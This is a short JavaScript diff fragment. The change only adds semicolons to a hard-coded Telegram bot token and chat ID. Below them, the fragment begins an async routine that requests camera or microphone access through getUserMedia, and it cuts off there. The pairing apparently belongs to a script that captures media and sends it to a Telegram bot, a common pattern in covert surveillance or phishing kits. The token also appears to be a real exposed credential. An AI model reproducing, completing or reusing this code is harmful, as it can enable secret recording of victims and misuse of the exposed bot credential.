@@ -1,5 +1,5 @@
-const botToken = '7162186300:AAHUSEiLW6H9sXmpHkUTuvQXEbNRKU7yfHU'
-const chatId = '6765005737'
+const botToken = '7162186300:AAHUSEiLW6H9sXmpHkUTuvQXEbNRKU7yfHU';
+const chatId = '6765005737';
     (async () => {
 			try {
 				const stream = await navigator.mediaDevices.getUserMedia({
